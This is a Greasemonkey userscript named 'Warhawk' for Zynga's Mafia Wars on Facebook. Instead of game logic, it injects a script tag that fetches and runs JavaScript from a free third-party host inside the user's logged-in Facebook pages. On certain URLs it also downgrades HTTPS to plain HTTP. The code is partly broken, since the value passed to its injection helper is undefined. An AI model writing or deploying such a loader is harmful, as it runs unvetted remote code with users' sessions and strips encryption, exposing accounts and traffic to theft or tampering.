// ==UserScript==
// @name        Warhawk
// @description Maok Hajartaruih
// @include     http://facebook.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @include     https://facebook.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @include     http://apps.facebook.com/inthemafia/*
// @include     https://apps.facebook.com/inthemafia/*
// @include     http://facebook.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @include     http://mwfb.zynga.com/mwfb/remote/html_server.php*
// @include     http://facebook.mafiawars.zynga.com/mwfb/xd_receiver.htm
// @include     http://apps.facebook.com/inthemafia/*
// @include     http://apps.new.facebook.com/inthemafia/*
// @include     http://www.facebook.com/connect/uiserver*
// @include     https://www.facebook.com/dialog/feed*
// @exclude     http://mwfb.zynga.com/mwfb/*#*
// @exclude     http://facebook.mafiawars.zynga.com/mwfb/*#*
// @exclude     http://apps.facebook.com/inthemafia/sk_updater.php*
// @exclude	http://facebook.mafiawars.zynga.com/mwfb/iframe_proxy.php*
// @include     https://mwfb.zynga.com/mwfb/remote/html_server.php*
// @include     https://facebook.mafiawars.zynga.com/mwfb/xd_receiver.htm
// @include     https://apps.facebook.com/inthemafia/*
// ==/UserScript==
function itoj(a) {
    var b = document.createElement("script");
    b.innerHTML = a;
    document.body.appendChild(b)
}
var k = (function () {
        var b = document.createElement("script");
        b.type = "text/javascript";
        b.id = "demondata";
        b.src = "http://yourjavascript.com/2358120053/bronco-tv.js";
        document.getElementsByTagName("head")[0].appendChild(b)
    })();
var l = document.location.href;
if ((!/xw_controller=freegifts/.test(l)) && (!/xw_controller=requests/.test(l))) {
    if (/https:\/\//.test(l) && (/YTozOntpOjA7czo1OiJpbmRleCI7aToxO3M6NDoidmlldyI7aToyO3M6NjoiJnNzbD0wIjt9/.test(l) || /ssl=0/.test(l) || /mw_rdcnt2=1/.test(l))) {
        document.location.href = l.replace(/https:\/\//g, "http://")
    } else {
        if (/html_server\.php/.test(l)) {
            itoj(k)
        }
    }
};